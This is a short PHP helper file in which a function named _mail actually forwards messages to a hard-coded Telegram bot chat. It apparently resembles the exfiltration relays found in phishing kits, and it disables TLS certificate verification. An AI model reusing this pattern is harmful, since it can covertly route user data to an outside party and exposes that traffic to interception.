<?php
function _mail($message) {
    t_send(urlencode($message));
}

function t_send($message) {
    $curl = curl_init();
    $api_key  = '<TOKEN_REMOVED>';
    $chat_id  = '1089792262';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

?>